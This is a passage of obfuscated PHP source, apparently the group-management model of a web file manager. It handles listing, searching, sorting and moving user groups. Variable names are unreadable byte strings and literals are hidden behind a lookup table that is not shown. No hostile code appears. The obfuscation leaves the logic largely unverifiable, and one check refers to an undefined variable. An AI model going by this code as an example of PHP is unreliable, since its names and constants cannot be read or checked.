$this->_clearCache($§Ç¦Ë¯â[$†Ö±¨ø[190]]); return $this->where($€°ûñÕÃ)->delete(); } protected function groupSort($Š–¾²õ) { $Ê†™ëÑ¼ =& $_SERVER[©—Ò»ÅĞ]; $ù×ıô°ñ = array(); foreach ($Š–¾²õ as $Øí›·ôş => $×Øø‡ÆÈ) { $ù×ıô°ñ[] = array($Ê†™ëÑ¼[1495], $×Øø‡ÆÈ, $Ê†™ëÑ¼[2205], $Øí›·ôş + 1); } $this->saveAll($ù×ıô°ñ); } public function listData() { $Š°ğÖñæ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Š°ğÖñæ[$_SERVER[©—Ò»ÅĞ][446]]); return $Š°ğÖñæ; } private function _makeOrder($™ö…ßíí = '') { $ÖÀ¼è¿ =& $_SERVER[©—Ò»ÅĞ]; $¬ÒÂ›”£ = array($ÖÀ¼è¿[1495], $ÖÀ¼è¿[32], $ÖÀ¼è¿[2171], $ÖÀ¼è¿[231]); $á’– ÎÜ = array($ÖÀ¼è¿[537] => $ÖÀ¼è¿[538], $ÖÀ¼è¿[539] => $ÖÀ¼è¿[540]); $Í¢Îø‹½ = Input::get($ÖÀ¼è¿[544], $ÖÀ¼è¿[7], $ÖÀ¼è¿[2187], $¬ÒÂ›”£); $îéÜŞú– = Input::get($ÖÀ¼è¿[545], $ÖÀ¼è¿[7], $ÖÀ¼è¿[2278], array($ÖÀ¼è¿[2278], $ÖÀ¼è¿[539])); $îéÜŞú– = $á’– ÎÜ[$îéÜŞú–]; $™ö…ßíí = $™ö…ßíí . "{$Í¢Îø‹½}\x20{$îéÜŞú–}\x2c\x20\x67\162\x6f\165\160\x49\104\x20\141\163\x63"; return $this->order($™ö…ßíí); } public function listChild($­ÜÙÄ â) { $ÀõöÂ­ö =& $_SERVER[©—Ò»ÅĞ]; $„«¹³—ø = $this->where(array($ÀõöÂ­ö[190] => $­ÜÙÄ â))->_makeOrder()->selectPage(200); $this->_listDataApply($„«¹³—ø[$ÀõöÂ­ö[446]]); return $„«¹³—ø; } public function listChildIds($†ÖŸ°õ) { $’¼ìÒÂö =& $_SERVER[©—Ò»ÅĞ]; if (is_string($É³şåŒ²)) { $†ÖŸ°õ = explode($’¼ìÒÂö[50], $†ÖŸ°õ); } $‘÷Ö§İ¿ = $this->where(array($’¼ìÒÂö[1495] => array($’¼ìÒÂö[7], $†ÖŸ°õ)))->field($’¼ìÒÂö[2279])->select(); if (!$‘÷Ö§İ¿) { return !1; } $¶îñÂê… = array(); foreach ($‘÷Ö§İ¿ as $ô©Àİâ) { $¶îñÂê…[] = "\163\x65\x6c\x65\x63\164\x20\147\162\x6f\x75\160\x49\x44\x20\146\162\x6f\x6d\40\140\147\162\x6f\165\160\x60\x20\167\x68\145\x72\x65\x20\x70\x61\162\x65\156\x74\x4c\x65\x76\145\x6c\x20\x6c\151\153\145\x20\47{$ô©Àİâ[$’¼ìÒÂö[604]]}{$ô©Àİâ[$’¼ìÒÂö[1495]]}\54\x25\47"; } $¶îñÂê… = implode($’¼ìÒÂö[2280], $¶îñÂê…); $‘÷Ö§İ¿ = $this->query($¶îñÂê…); if (!$‘÷Ö§İ¿) { return array(); } $†ÖŸ°õ = array_to_keyvalue($‘÷Ö§İ¿, $’¼ìÒÂö[12], $’¼ìÒÂö[1495]); return array_unique($†ÖŸ°õ); } public function listByID($¢÷–’…²) { $šÕö”€ =& $_SERVER[©—Ò»ÅĞ]; if (!$¢÷–’…²) { return array(); } $…÷çŸ…ç = array($šÕö”€[1495] => array($šÕö”€[7], $¢÷–’…²)); $ùİÓĞÛ² = $this->where($…÷çŸ…ç)->select(); $ùİÓĞÛ² = array_sort_keep($ùİÓĞÛ², $šÕö”€[1495], $¢÷–’…²); $this->_listDataApply($ùİÓĞÛ²); return $ùİÓĞÛ²; } public function listSearch($øÀŞÄø·) { $ş—ù„ÀÀ =& $_SERVER[©—Ò»ÅĞ]; $³Ç¿ìö© = trim($øÀŞÄø·[$ş—ù„ÀÀ[2281]]); $¯œØ÷ÚÄ = explode($ş—ù„ÀÀ[53], $³Ç¿ìö©); if (!$³Ç¿ìö© || count($¯œØ÷ÚÄ) == 1) { return $this->listSearchNow($øÀŞÄø·); } $“í‚”‹Ù = array($ş—ù„ÀÀ[446] => array()); foreach ($¯œØ÷ÚÄ as $ë¸Ì­¹ø) { if (!trim($ë¸Ì­¹ø)) { continue; } $øÀŞÄø·[$ş—ù„ÀÀ[2281]] = $ë¸Ì­¹ø; $Û¨ÌÚõÇ = $this->listSearchNow($øÀŞÄø·); $“í‚”‹Ù[$ş—ù„ÀÀ[446]] = array_merge($“í‚”‹Ù[$ş—ù„ÀÀ[446]], $Û¨ÌÚõÇ[$ş—ù„ÀÀ[446]]); } $“í‚”‹Ù[$ş—ù„ÀÀ[446]] = array_unique_by_key($“í‚”‹Ù[$ş—ù„ÀÀ[446]], $ş—ù„ÀÀ[1495]); $“í‚”‹Ù[$ş—ù„ÀÀ[443]] = array($ş—ù„ÀÀ[444] => count($“í‚”‹Ù[$ş—ù„ÀÀ[446]]), $ş—ù„ÀÀ[439] => 20, $ş—ù„ÀÀ[428] => 1, $ş—ù„ÀÀ[445] => 1); return $“í‚”‹Ù; } public function listSearchNow($”ùÁêæ´) { $Õ Î¹ã¬ =& $_SERVER[©—Ò»ÅĞ]; $€Åœº‡ä = trim($”ùÁêæ´[$Õ Î¹ã¬[2281]]); $³›æ®š = isset($”ùÁêæ´[$Õ Î¹ã¬[2282]]) ? $”ùÁêæ´[$Õ Î¹ã¬[2282]] : !1; if (!trim($€Åœº‡ä)) { return !1; } $€Åœº‡ä = str_replace($Õ Î¹ã¬[2283], $Õ Î¹ã¬[2284], $€Åœº‡ä); $‚…Û†Ï· = array($Õ Î¹ã¬[1495] => array($Õ Î¹ã¬[473], "{$€Åœº‡ä}\x25"), $Õ Î¹ã¬[32] => array($Õ Î¹ã¬[473], "\45{$€Åœº‡ä}\x25"), $Õ Î¹ã¬[1168] => $Õ Î¹ã¬[2285]); if ($³›æ®š) { $¾æéÚÒ = $this->getInfoSimple($³›æ®š); $ŒœÜğ = $¾æéÚÒ[$Õ Î¹ã¬[604]] . $³›æ®š . $Õ Î¹ã¬[636]; $‚…Û†Ï· = array($‚…Û†Ï·, array($Õ Î¹ã¬[604] => array($Õ Î¹ã¬[473], $ŒœÜğ))); } $‚…Û†Ï· = $this->parseWhereLike($‚…Û†Ï·); $Ñô‡²® = $this->_makeOrder()->where($‚…Û†Ï·)->selectPage(20); $Ñô‡²® = $Ñô‡²® ? $Ñô‡²® : array($Õ Î¹ã¬[446] => array(), $Õ Î¹ã¬[443] => array()); if (!$Ñô‡²® || count($Ñô‡²®[$Õ Î¹ã¬[446]]) < 5 && Input::check($€Åœº‡ä, $Õ Î¹ã¬[393])) { $ƒ»Š” = $this->groupChildrenAll($³›æ®š); $Ô±àê‰à = $this->_searchFromMeta($Õ Î¹ã¬[551], $€Åœº‡ä, 10, $ƒ»Š”); $¾±Â—…¥ = $this->_searchFromMeta($Õ Î¹ã¬[552], $€Åœº‡ä, 10, $ƒ»Š”); $¶™Ïúˆ = array_merge($Ô±àê‰à, $¾±Â—…¥, $Ñô‡²®[$Õ Î¹ã¬[446]]); $Ñô‡²®[$Õ Î¹ã¬[446]] = array_unique_by_key($¶™Ïúˆ, $Õ Î¹ã¬[1495]); $Ñô‡²®[$Õ Î¹ã¬[443]][$Õ Î¹ã¬[444]] = count($Ñô‡²®[$Õ Î¹ã¬[446]]); $Ñô‡²®[$Õ Î¹ã¬[443]][$Õ Î¹ã¬[445]] = ceil($Ñô‡²®[$Õ Î¹ã¬[443]][$Õ Î¹ã¬[444]] / $Ñô‡²®[$Õ Î¹ã¬[443]][$Õ Î¹ã¬[439]]); } $this->_listDataApply($Ñô‡²®[$Õ Î¹ã¬[446]]); return $Ñô‡²®; } protected function groupChildrenAll($Êûàíµ´) { $ÂÃ‘ñèÜ =& $_SERVER[©—Ò»ÅĞ]; if (!$Êûàíµ´) { return !1; } if (!is_array($Êûàíµ´)) { $Êûàíµ´ = array($Êûàíµ´); } $±à“¤•Ê = $Êûàíµ´; foreach ($Êûàíµ´ as $êÎÑ£½) { $Ö—òÀÈ„ = $this->getInfoSimple($êÎÑ£½); $â†ó®ê = array($ÂÃ‘ñèÜ[604] => array($ÂÃ‘ñèÜ[473], $Ö—òÀÈ„[$ÂÃ‘ñèÜ[604]] . $êÎÑ£½ . $ÂÃ‘ñèÜ[636])); $ãùôûã‡ = $this->field($ÂÃ‘ñèÜ[1495])->where($â†ó®ê)->select(); $±à“¤•Ê = array_merge($±à“¤•Ê, array_to_keyvalue($ãùôûã‡, $ÂÃ‘ñèÜ[12], $ÂÃ‘ñèÜ[1495])); } return array_unique($±à“¤•Ê); } private function _searchFromMeta($‡İı©ĞÑ, $Š§×Ï˜İ, $òïìÊ°Ù, $ù˜¯Âûğ) { $“‚õ½ÔÃ =& $_SERVER[©—Ò»ÅĞ]; $Š§×Ï˜İ = strtolower($Š§×Ï˜İ); $¡ÍÂèÛÍ = array($“‚õ½ÔÃ[95] => $‡İı©ĞÑ, $“‚õ½ÔÃ[451] => array($“‚õ½ÔÃ[473], "\45{$Š§×Ï˜İ}\x25")); $¡ÍÂèÛÍ = $this->parseWhereLike($¡ÍÂèÛÍ); if ($ù˜¯Âûğ) { $¡ÍÂèÛÍ[$“‚õ½ÔÃ[1495]] = array($“‚õ½ÔÃ[7], $ù˜¯Âûğ); } $±º¿û·ï = Model($“‚õ½ÔÃ[2286])->where($¡ÍÂèÛÍ)->limit($òïìÊ°Ù)->select(); if (!$±º¿û·ï) { return array(); } $±º¿û·ï = array_to_keyvalue($±º¿û·ï, $“‚õ½ÔÃ[12], $“‚õ½ÔÃ[1495]); $é³˜™ = $this->where(array($“‚õ½ÔÃ[2270] => array($“‚õ½ÔÃ[7], $±º¿û·ï)))->select(); if (!$é³˜™) { return array(); } return $é³˜™; } protected function _listDataApplyItem($íóõú™) { $ıô‡‡Æâ = array($íóõú™); $this->_listDataApply($ıô‡‡Æâ); return $ıô‡‡Æâ[0]; } protected function _listDataApply(&$çŸŸ”´å) { $¶û¬ÁºÉ =& $_SERVER[©—Ò»ÅĞ]; if (!$çŸŸ”´å) { return; } $–ËÑ·ºõ = array_to_keyvalue($çŸŸ”´å, $¶û¬ÁºÉ[12], $¶û¬ÁºÉ[1495]); $this->_listAppendChildren($çŸŸ”´å); $this->_listAppendChildrenMember($çŸŸ”´å); $this->_listAppendMeta($çŸŸ”´å, $–ËÑ·ºõ); $this->_listAppendParent($çŸŸ”´å); $this->_listAppendSourceRoot($çŸŸ”´å, $–ËÑ·ºõ); } private function _listAppendChildren(&$Èï…ßøå) { $ Ôº²‹ğ =& $_SERVER[©—Ò»ÅĞ]; $·„ƒı®ä = array_to_keyvalue($Èï…ßøå, $ Ôº²‹ğ[12], $ Ôº²‹ğ[1495]); $Ô´ãæ¤’ = array($ Ôº²‹ğ[190] => array($ Ôº²‹ğ[7], $·„ƒı®ä)); $šºÁ¬œ— = array($ Ôº²‹ğ[190], $ Ôº²‹ğ[2287] => $ Ôº²‹ğ[585]); $ğ‡úñÔ¸ = $this->field($šºÁ¬œ—)->where($Ô´ãæ¤’)->group($ Ôº²‹ğ[190])->select(); $¨‹¼‡ = array_to_keyvalue($ğ‡úñÔ¸, $ Ôº²‹ğ[190], $ Ôº²‹ğ[585]); foreach ($Èï…ßøå as &$„¬Â¬Ç˜) { $ÙåÛà±’ = $„¬Â¬Ç˜[$ Ôº²‹ğ[1495]]; $„¬Â¬Ç˜[$ Ôº²‹ğ[2288]] = isset($¨‹¼‡[$ÙåÛà±’]) ? intval($¨‹¼‡[$ÙåÛà±’]) : !1; } unset($„¬Â¬Ç˜); } private function _listAppendChildrenMember(&$ ’ıçş) { $¶Šş¢‘ï =& $_SERVER[©—Ò»ÅĞ]; $ÃÎ´ò = array_to_keyvalue($ ’ıçş, $¶Šş¢‘ï[12], $¶Šş¢‘ï[1495]); $éæÏîõ = array($¶Šş¢‘ï[1495] => array($¶Šş¢‘ï[7], $ÃÎ´ò)); $¸ó¾ê¸µ = array($¶Šş¢‘ï[1495], $¶Šş¢‘ï[2287] => $¶Šş¢‘ï[585]); $÷‚±§ñÅ = Model($¶Šş¢‘ï[2277])->field($¸ó¾ê¸µ)->where($éæÏîõ)->group($¶Šş¢‘ï[1495])->select(); $ã‹ÁÄİğ = array_to_keyvalue($÷‚±§ñÅ, $¶Šş¢‘ï[1495], $¶Šş¢‘ï[585]); foreach ($ ’ıçş as &$È´Úùò) { $õ–ĞÖ¹ã = $È´Úùò[$¶Šş¢‘ï[1495]]; $È´Úùò[$¶Šş¢‘ï[2289]] = isset($ã‹ÁÄİğ[$õ–ĞÖ¹ã]) ? intval($ã‹ÁÄİğ[$õ–ĞÖ¹ã]) : !1; } unset($È´Úùò); } private function _listAppendMeta(&$¿•ìÔ¹æ, $êşç¨áî) { $â õºè =& $_SERVER[©—Ò»ÅĞ]; $îæğÏÊÎ = array($â õºè[1495] => array($â õºè[7], $êşç¨áî)); $ƒíç¡á– = Model($â õºè[2276])->where($îæğÏÊÎ)->select(); $ƒíç¡á– = array_to_keyvalue_group($ƒíç¡á–, $â õºè[1495]); foreach ($ƒíç¡á– as &$©™¤Ì÷Û) { $©™¤Ì÷Û = array_to_keyvalue($©™¤Ì÷Û, $â õºè[95], $â õºè[451]); } unset($©™¤Ì÷Û); foreach ($¿•ìÔ¹æ as &$”¬‰Ì€) { $”¬‰Ì€[$â õºè[555]] = array(); if (isset($ƒíç¡á–[$”¬‰Ì€[$â õºè[1495]]])) { $”¬‰Ì€[$â õºè[555]] = $ƒíç¡á–[$”¬‰Ì€[$â õºè[1495]]]; } } unset($”¬‰Ì€); } protected function parentLevelArray($¨‡İ»Ú²) { $§‚Â´ô =& $_SERVER[©—Ò»ÅĞ]; $¨‡İ»Ú² = explode($§‚Â´ô[50], trim($¨‡İ»Ú², $§‚Â´ô[50])); $¨‡İ»Ú² = array_remove_value($¨‡İ»Ú², $§‚Â´ô[228]); return $¨‡İ»Ú²; } protected function parentInGroup($éÚÌ’‚Ü, $èŒ¾ëƒ…) { $‡¦Û¼–Ü =& $_SERVER[©—Ò»ÅĞ]; $»½ïú±Œ = $this->getInfoSimple($éÚÌ’‚Ü); if (!$»½ïú±Œ) { return !0; } $šˆ¦ËœÈ = $this->parentLevelArray($»½ïú±Œ[$‡¦Û¼–Ü[604]]); $šˆ¦ËœÈ[] = $éÚÌ’‚Ü; foreach ($šˆ¦ËœÈ as $éÚÌ’‚Ü) { if (in_array($éÚÌ’‚Ü . $‡¦Û¼–Ü[12], $èŒ¾ëƒ…)) { return !0; } } return !1; } private function _listAppendParent(&$ê¤—îáÃ) { $åçá¡€Ù =& $_SERVER[©—Ò»ÅĞ]; $¢å±ëï = array(); foreach ($ê¤—îáÃ as &$›¢Ñ¹ß) { $¢å±ëï[$›¢Ñ¹ß[$åçá¡€Ù[1495]]] = $›¢Ñ¹ß[$åçá¡€Ù[32]]; $‡ší­ôô = $this->parentLevelArray($›¢Ñ¹ß[$åçá¡€Ù[604]]); foreach ($‡ší­ôô as $£˜òü) { if (!isset($¢å±ëï[$£˜òü])) { $¢å±ëï[$£˜òü] = 0; } } } unset($›¢Ñ¹ß); foreach ($¢å±ëï as $¨ëî¦æÊ => $Í¿¢òæ) { if ($Í¿¢òæ) { continue; } $Ù —¥Ã¬ = $this->getInfoSimple($¨ëî¦æÊ); $¢å±ëï[$¨ëî¦æÊ] = $Ù —¥Ã¬[$åçá¡€Ù[32]]; } $Œ¢ª²ÑÓ = $GLOBALS[$åçá¡€Ù[6]][$åçá¡€Ù[92]][$åçá¡€Ù[2290]]; if (KodUser::isRoot()) { $Œ¢ª²ÑÓ = !1; } foreach ($ê¤—îáÃ as &$›¢Ñ¹ß) { $‡ší­ôô = $this->parentLevelArray($›¢Ñ¹ß[$åçá¡€Ù[604]]); $Ü‚£™¸â = $åçá¡€Ù[12]; foreach ($‡ší­ôô as $¨ëî¦æÊ => $£˜òü) { if ($Œ¢ª²ÑÓ && $¨ëî¦æÊ == 0) { continue; } $Ü‚£™¸â .= $¢å±ëï[$£˜òü] . $åçá¡€Ù[8]; } if ($‡ší­ôô) { $Ü‚£™¸â .= $›¢Ñ¹ß[$åçá¡€Ù[32]]; } $›¢Ñ¹ß[$åçá¡€Ù[609]] = str_replace($åçá¡€Ù[254], $åçá¡€Ù[8], $Ü‚£™¸â); } unset($›¢Ñ¹ß); } private function _listAppendSourceRoot(&$Ñıİ×ˆ, $”ıŞÎ´) { $ËÏ²Ş¯’ =& $_SERVER[©—Ò»ÅĞ]; $òùŸ„ÄÅ = Model($ËÏ²Ş¯’[933])->listSourceRoot(SourceModel::TYPE_GROUP, $”ıŞÎ´); $òùŸ„ÄÅ = array_to_keyvalue($òùŸ„ÄÅ, $ËÏ²Ş¯’[589]); $òùŸ„ÄÅ = array_remove_key($òùŸ„ÄÅ, $ËÏ²Ş¯’[589]); foreach ($Ñıİ×ˆ as &$ù“ÖãÖ) { $ù“ÖãÖ[$ËÏ²Ş¯’[90]] = $òùŸ„ÄÅ[$ù“ÖãÖ[$ËÏ²Ş¯’[1495]]] ? $òùŸ„ÄÅ[$ù“ÖãÖ[$ËÏ²Ş¯’[1495]]] : array(); } unset($ù“ÖãÖ); } protected function groupMerge($‘ó¸üÅÅ) { $‘ó¸üÅÅ = array_values(array_unique($‘ó¸üÅÅ)); $äÊ¢€ƒÕ = array(); for ($öÔÆÒÇö = 0; $öÔÆÒÇö < count($‘ó¸üÅÅ); $öÔÆÒÇö++) { $ßœı¬ÆŠ = !1; for ($Ïöıê¬™ = 0; $Ïöıê¬™ < count($‘ó¸üÅÅ); $Ïöıê¬™++) { if ($öÔÆÒÇö == $Ïöıê¬™) { continue; } if ($this->isParentOf($‘ó¸üÅÅ[$Ïöıê¬™], $‘ó¸üÅÅ[$öÔÆÒÇö])) { $ßœı¬ÆŠ = !0; break; } } if (!$ßœı¬ÆŠ) { $äÊ¢€ƒÕ[] = $‘ó¸üÅÅ[$öÔÆÒÇö]; } } return $äÊ¢€ƒÕ; } protected function isParentOf($Ñ¬„—ä—, $ ó˜öó’) { $˜ØÙÑ‡™ =& $_SERVER[©—Ò»ÅĞ]; if (!$Ñ¬„—ä— || !$ ó˜öó’ || $Ñ¬„—ä— == $ ó˜öó’) { return !1; } $¸ØçË¢ = $this->getInfoSimple($Ñ¬„—ä—); $ÖÆ¥í = $this->getInfoSimple($ ó˜öó’); $½¿¾‰õõ = $¸ØçË¢[$˜ØÙÑ‡™[604]] . $Ñ¬„—ä— . $˜ØÙÑ‡™[50]; if (substr($ÖÆ¥í[$˜ØÙÑ‡™[604]], 0, strlen($½¿¾‰õõ)) == $½¿¾‰õõ) { return !0; } return !1; } public function groupShowRoot($ãíáßê¥, $İ¼ÇÖ › = false) { $Ä¤›²Ìƒ =& $_SERVER[©—Ò»ÅĞ]; $×â€¢ü  = $this->getInfo($ãíáßê¥); if (!$×â€¢ü ) { return array(); } $Ë±¤îé˜ = $this->parentLevelArray($×â€¢ü [$Ä¤›²Ìƒ[604]]); $ı‚×¯¯ = array($ãíáßê¥); if (count($Ë±¤îé˜) == 0) { return $ı‚×¯¯; } if ($İ¼ÇÖ › && count($Ë±¤îé˜) == 1) { return $ı‚×¯¯; } if (!$×â€¢ü [$Ä¤›²Ìƒ[555]] || !isset($×â€¢ü [$Ä¤›²Ìƒ[555]][$Ä¤›²Ìƒ[2271]]) || $×â€¢ü [$Ä¤›²Ìƒ[555]][$Ä¤›²Ìƒ[2271]] == $Ä¤›²Ìƒ[944]) { return $this->groupShowRoot($Ë±¤îé˜[count($Ë±¤îé˜) - 1], $İ¼ÇÖ ›); } if ($×â€¢ü [$Ä¤›²Ìƒ[555]][$Ä¤›²Ìƒ[2271]] == $Ä¤›²Ìƒ[432]) { $„±‡ÙÏ— = explode($Ä¤›²Ìƒ[50], $×â€¢ü [$Ä¤›²Ìƒ[555]][$Ä¤›²Ìƒ[2272]]); if ($„±‡ÙÏ—) { $ı‚×¯¯ = array_merge($ı‚×¯¯, $„±‡ÙÏ—); } } return $ı‚×¯¯; } protected function resetParentLevel() { $±Ÿ¸ş® =& $_SERVER[©—Ò»ÅĞ]; $À¡Úªåİ = $±Ÿ¸ş®[1495]; $˜åñ¦À’ = $this->select(); $˜åñ¦À’ = array_to_keyvalue($˜åñ¦À’, $À¡Úªåİ); foreach ($˜åñ¦À’ as $…ò¬ Çï) { $œ†ÄŠ¤õ = $…ò¬ Çï; $ŞÚ¥¤Ä± = array(); while ($œ†ÄŠ¤õ[$±Ÿ¸ş®[190]] != 0) { $ŞÚ¥¤Ä±[] = $œ†ÄŠ¤õ[$±Ÿ¸ş®[190]]; $œ†ÄŠ¤õ = $˜åñ¦À’[$œ†ÄŠ¤õ[$±Ÿ¸ş®[190]]]; } $ŞÚ¥¤Ä±[] = 0; $ŞÚ¥¤Ä± = $±Ÿ¸ş®[50] . implode($±Ÿ¸ş®[50], array_reverse($ŞÚ¥¤Ä±)) . $±Ÿ¸ş®[50]; $this->setNamePinyin($…ò¬ Çï[$À¡Úªåİ], $…ò¬ Çï[$±Ÿ¸ş®[32]]); $this->where(array($À¡Úªåİ => $…ò¬ Çï[$À¡Úªåİ]))->save(array($±Ÿ¸ş®[674] => $ŞÚ¥¤Ä±)); } return $˜åñ¦À’; } public function groupNameAuto($ÎÂü¬…­, $ÀËã­Éî) { $ÎåÀ¬ÅÄ =& $_SERVER[©—Ò»ÅĞ]; $ô¥ƒÏ½Ó = $this->where(array($ÎåÀ¬ÅÄ[492] => $ÎÂü¬…­))->getField($ÎåÀ¬ÅÄ[32], !0); if (!$ô¥ƒÏ½Ó || !in_array($ÀËã­Éî, $ô¥ƒÏ½Ó)) { return $ÀËã­Éî; } for ($úŒ²ôÈƒ = 1; $úŒ²ôÈƒ <= count($ô¥ƒÏ½Ó) + 1; $úŒ²ôÈƒ++) { $ÌàŞÛ“ù = $ÀËã­Éî . "\50{$úŒ²ôÈƒ}\51"; if (!in_array($ÌàŞÛ“ù, $ô¥ƒÏ½Ó)) { return $ÌàŞÛ“ù; } } } public function groupSwitch($£¥Û¹‘ş, $÷”ÙÙç) { $¨ÊŞú‡¦ =& $_SERVER[©—Ò»ÅĞ]; $‹Ø¾»£­ = array($¨ÊŞú‡¦[1495] => array($¨ÊŞú‡¦[7], array($£¥Û¹‘ş, $÷”ÙÙç))); $…ö±Ÿ¦È = $this->where($‹Ø¾»£­)->select(); $…ö±Ÿ¦È = array_to_keyvalue($…ö±Ÿ¦È, $¨ÊŞú‡¦[1495]); $é«ŠÌÜ“ = _get($…ö±Ÿ¦È, $£¥Û¹‘ş); $ÛÀ¦˜®Æ = _get($…ö±Ÿ¦È, $÷”ÙÙç); if (!$é«ŠÌÜ“ || !$ÛÀ¦˜®Æ || $é«ŠÌÜ“[$¨ÊŞú‡¦[190]] == 0) { return !1; } if ($é«ŠÌÜ“[$¨ÊŞú‡¦[1495]] == $ÛÀ¦˜®Æ[$¨ÊŞú‡¦[1495]]) { return !1; } if (strpos($ÛÀ¦˜®Æ[$¨ÊŞú‡¦[604]], $é«ŠÌÜ“[$¨ÊŞú‡¦[604]] . $é«ŠÌÜ“[$¨ÊŞú‡¦[1495]] . $¨ÊŞú‡¦[50]) === 0) { return !1; } $‹Ø¾»£­ = array($¨ÊŞú‡¦[1495] => $£¥Û¹‘ş); $ªÏ¶«˜ = Model($¨ÊŞú‡¦[2277])->where($‹Ø¾»£­)->select(); if (!$ªÏ¶«˜) { $ªÏ¶«˜ = array(); } foreach ($ªÏ¶«˜ as $şß©®Š•) { $ôÙÙÏÑ = $şß©®Š•[$¨ÊŞú‡¦[1592]]; $‹Ø¾»£­ = array($¨ÊŞú‡¦[1592] => $ôÙÙÏÑ, $¨ÊŞú‡¦[1495] => $÷”ÙÙç); $¡Ø‡ş÷ñ = Model($¨ÊŞú‡¦[2277])->where($‹Ø¾»£­)->find(); if (!$¡Ø‡ş÷ñ) { $¤ˆè÷«¦ = array($÷”ÙÙç => $şß©®Š•[$¨ÊŞú‡¦[1640]]); Model($¨ÊŞú‡¦[617])->userGroupAdd($ôÙÙÏÑ, $¤ˆè÷«¦); } Model($¨ÊŞú‡¦[617])->userGroupRemove($ôÙÙÏÑ, $£¥Û¹‘ş); } $‹Ø¾»£­ = array($¨ÊŞú‡¦[188] => 2, $¨ÊŞú‡¦[190] => 0, $¨ÊŞú‡¦[500] => 1, $¨ÊŞú‡¦[589] => array($¨ÊŞú‡¦[7], array($£¥Û¹‘ş, $÷”ÙÙç))); $°¨’¡ØÁ = Model($¨ÊŞú‡¦[933])->where($‹Ø¾»£­)->field($¨ÊŞú‡¦[2291])->select(); $°¨’¡ØÁ = array_to_keyvalue($°¨’¡ØÁ, $¨ÊŞú‡¦[589], $¨ÊŞú‡¦[191]); $›ÜÃ¢¶ = !empty($°¨’¡ØÁ[$£¥Û¹‘ş]) ? $°¨’¡ØÁ[$£¥Û¹‘ş] : !1; if ($›ÜÃ¢¶) { if (!$°¨’¡ØÁ[$÷”ÙÙç]) { $°¨’¡ØÁ[$÷”ÙÙç] = Model($¨ÊŞú‡¦[933])->groupRootAdd($÷”ÙÙç); } $›½Ìóğœ = $°¨’¡ØÁ[$÷”ÙÙç]; $‹Ø¾»£­ = array($¨ÊŞú‡¦[190] => $›ÜÃ¢¶); $°¨’¡ØÁ = Model($¨ÊŞú‡¦[933])->where($‹Ø¾»£­)->field($¨ÊŞú‡¦[2292])->select(); if (!$°¨’¡ØÁ) { $°¨’¡ØÁ = array(); } Model($¨ÊŞú‡¦[933])->moveClearAuth = !1; foreach ($°¨’¡ØÁ as $èûæÍÄ) { $ İì£—ƒ = $èûæÍÄ[$¨ÊŞú‡¦[500]] == $¨ÊŞú‡¦[91] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($¨ÊŞú‡¦[933])->move($èûæÍÄ[$¨ÊŞú‡¦[191]], $›½Ìóğœ, $ İì£—ƒ); } Model($¨ÊŞú‡¦[933])->moveClearAuth = !0; $‹Ø¾»£­ = array($¨ÊŞú‡¦[188] => 2, $¨ÊŞú‡¦[589] => $£¥Û¹‘ş); $ÕñÂ°© = array($¨ÊŞú‡¦[589] => $÷”ÙÙç); Model($¨ÊŞú‡¦[2293])->where($‹Ø¾»£­)->save($ÕñÂ°©); Model($¨ÊŞú‡¦[2294])->where($‹Ø¾»£­)->save($ÕñÂ°©); } $this->_changeChildLevel($…ö±Ÿ¦È[$£¥Û¹‘ş], $…ö±Ÿ¦È[$÷”ÙÙç], !0); $this->where(array($¨ÊŞú‡¦[190] => $£¥Û¹‘ş))->save(array($¨ÊŞú‡¦[190] => $÷”ÙÙç)); $this->_clearChildrenCache($…ö±Ÿ¦È[$÷”ÙÙç]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\x75\x73\x65\162\x5f\x66\141\166"; protected function cacheFunctionAlias($ÚŒ½óÚæ) { $µœô¢Ïç =& $_SERVER[©—Ò»ÅĞ]; return array($µœô¢Ïç[2295] => array($ÚŒ½óÚæ[0], $µœô¢Ïç[2296]), $µœô¢Ïç[2297] => array($ÚŒ½óÚæ[0], $µœô¢Ïç[2298])); } protected function ___get($™­ÖàÊØ) { $È¥‡è…Ã =& $_SERVER[©—Ò»ÅĞ]; $‚É¡šûÅ = Model($È¥‡è…Ã[605])->metaGet($™­ÖàÊØ, $È¥‡è…Ã[2299]); $ÔàØ×¿¨ = json_decode($‚É¡šûÅ, !0); return $ÔàØ×¿¨ ? $ÔàØ×¿¨ : array($È¥‡è…Ã[2300] => $È¥‡è…Ã[91], $È¥‡è…Ã[446] => array()); } protected function ___listData($ïˆ—›Ùœ) { $ÕËğØ¤ =& $_SERVER[©—Ò»ÅĞ]; $Íûí£“İ = array($ÕËğØ¤[1969] => 0, $ÕËğØ¤[573] => array($ÕËğØ¤[2301], 0), $ÕËğØ¤[511] => $ÕËğØ¤[1491] . $ïˆ—›Ùœ); $ë™áøõŸ = $ÕËğØ¤[2302]; $µ¤×‡â = $this->field($ë™áøõŸ)->where($Íûí£“İ)->order($ÕËğØ¤[2303])->select(); return $µ¤×‡â ? $µ¤×‡â : array(); } protected function set($¹÷äŒµÙ, $è²ÍÎò) { $ê·›„Õ¹ =& $_SERVER[©—Ò»ÅĞ]; $è²ÍÎò = $è²ÍÎò ? $è²ÍÎò : array($ê·›„Õ¹[2300] => $ê·›„Õ¹[91], $ê·›„Õ¹[446] => array()); return Model($ê·›„Õ¹[605])->metaSet($¹÷äŒµÙ, $ê·›„Õ¹[2299], json_encode($è²ÍÎò)); } protected function getByTagID($ë¾Éæá¼, $ÇÛàøÇÓ) { $ºÜÓêóÚ =& $_SERVER[©—Ò»ÅĞ]; if (!$ë¾Éæá¼ || !$ÇÛàøÇÓ) { return !1; } if (!Model($ºÜÓêóÚ[605])->getInfoSimple($ë¾Éæá¼)) { return !1; } $ó×äÒ©‹ = $this->get($ë¾Éæá¼); if (!$ó×äÒ©‹ || !isset($ó×äÒ©‹[$ºÜÓêóÚ[446]])) { return !1; } $™ ¤ÉÅÄ = array_find_by_field($ó×äÒ©‹[$ºÜÓêóÚ[446]], $ºÜÓêóÚ[487], $ÇÛàøÇÓ); return is_array($™ ¤ÉÅÄ) ? $™ ¤ÉÅÄ : !1; } public function listSource($®µú£µ, $ìğ‚ƒÕ…) { $Í’Ü¡½‡ =& $_SERVER[©—Ò»ÅĞ]; if ($ìğ‚ƒÕ… && !is_array($ìğ‚ƒÕ…)) { $ìğ‚ƒÕ… = array($ìğ‚ƒÕ…); } $‹ …éó· = $this->get($®µú£µ); $¥ôó• = array_to_keyvalue($‹ 